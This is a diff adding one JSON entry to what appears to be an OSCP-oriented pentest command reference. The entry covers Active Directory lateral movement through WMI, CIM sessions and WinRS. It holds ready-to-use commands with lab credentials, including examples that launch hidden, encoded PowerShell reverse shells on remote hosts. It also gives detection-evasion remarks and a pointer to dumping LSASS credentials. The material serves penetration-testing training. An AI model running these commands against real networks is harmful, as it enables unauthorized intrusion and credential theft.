@@ -1,0 +1,102 @@
+{
+  "id": "ad-wmi-cim-exec",
+  "name": "AD Lateral Movement - WMI/CIM & WinRS Execution",
+  "command": "wmic /node:<target> /user:<domain>\\<user> /password:<pass> process call create \"<cmd>\"\nwinrs -r:<target> -u:<domain>\\<user> -p:<pass> \"cmd /c <cmd>\"",
+  "description": "Execute commands on remote Windows hosts using WMI (wmic /node or PowerShell CIM sessions) and WinRS (Windows Remote Shell). WMI via wmic.exe uses DCOM/RPC (port 135 + dynamic range). CIM sessions via PowerShell use DCOM (New-CimSessionOption -Protocol DCOM) or WSMan. WinRS uses WinRM (port 5985) and is simpler than full PSRemoting. All three require valid credentials and are commonly used for lateral movement when you have cleartext creds or can relay NTLM.",
+  "type": "script",
+  "platform": "windows",
+  "requires": [
+    "valid-credentials",
+    "local-admin-on-target"
+  ],
+  "tools": [
+    "wmic",
+    "winrs",
+    "powershell"
+  ],
+  "tags": [
+    "active-directory",
+    "lateral-movement",
+    "wmi",
+    "winrm",
+    "winrs",
+    "cim-session",
+    "remote-execution"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Remote Execution",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 23: Lateral Movement in Active Directory (23.1.1 WMI and WinRM)",
+  "examples": [
+    {
+      "label": "wmic - run a command on a remote host (cleartext creds)",
+      "command": "wmic /node:192.168.50.73 /user:corp\\jen /password:Nexus123! process call create \"calc.exe\""
+    },
+    {
+      "label": "wmic - execute a reverse shell one-liner",
+      "command": "wmic /node:<target> /user:<domain>\\<user> /password:<pass> process call create \"powershell -nop -w hidden -e <base64_payload>\""
+    },
+    {
+      "label": "PowerShell CIM session via DCOM (firewall-friendly alternative to WinRM)",
+      "command": "$username = 'jen'\n$password = 'Nexus123!'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options\n$command = 'calc'\nInvoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}"
+    },
+    {
+      "label": "WinRS - quick remote shell command",
+      "command": "winrs -r:files04 -u:corp\\jen -p:Nexus123! \"cmd /c hostname & whoami\""
+    },
+    {
+      "label": "WinRS - execute encoded PowerShell reverse shell",
+      "command": "winrs -r:files04 -u:corp\\jen -p:Nexus123! \"powershell -nop -w hidden -e <base64_payload>\""
+    },
+    {
+      "label": "Check if WinRM is listening on target (from attacker Linux)",
+      "command": "nmap -p 5985,5986 <target>"
+    }
+  ],
+  "notes": "wmic.exe is deprecated in Windows 11 24H2+ but still present on most enterprise hosts. CIM via DCOM (-Protocol DCOM) works even if WinRM isn't enabled \u2014 it uses port 135 plus dynamic high ports. CIM via WSMan (-Protocol WSMan) requires WinRM. WinRS is essentially a lightweight version of PSRemoting \u2014 it runs single commands rather than interactive sessions. For interactive shells use evil-winrm (see ad-evil-winrm). All these methods create Win32_Process objects or run remote commands \u2014 they generate Windows Event ID 4648/4624 (explicit credential logon) and WMI activity event 5857/5858/5860. wmic /node is louder than CIM sessions because wmic.exe is flagged by many AV/EDR products.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Lateral Movement in Active Directory",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Windows Management Instrumentation",
+      "url": "https://attack.mitre.org/techniques/T1047/"
+    },
+    {
+      "title": "MITRE ATT&CK - Remote Services: Windows Remote Management",
+      "url": "https://attack.mitre.org/techniques/T1021/006/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-evil-winrm",
+      "rel": "alternative",
+      "note": "evil-winrm gives an interactive WinRM session from Linux \u2014 more convenient than winrs."
+    },
+    {
+      "id": "ad-dcom-exec",
+      "rel": "alternative",
+      "note": "DCOM via MMC20.Application.1 is another lateral movement method using COM objects."
+    },
+    {
+      "id": "pth-impacket",
+      "rel": "alternative",
+      "note": "impacket-wmiexec does the same via WMI but authenticates with an NT hash (no cleartext needed)."
+    },
+    {
+      "id": "ad-mimikatz-sekurlsa",
+      "rel": "prereq",
+      "note": "Dump credentials from LSASS first to get user NT hashes."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1047",
+    "T1021.006"
+  ],
+  "exam": "exam-ok"
+}
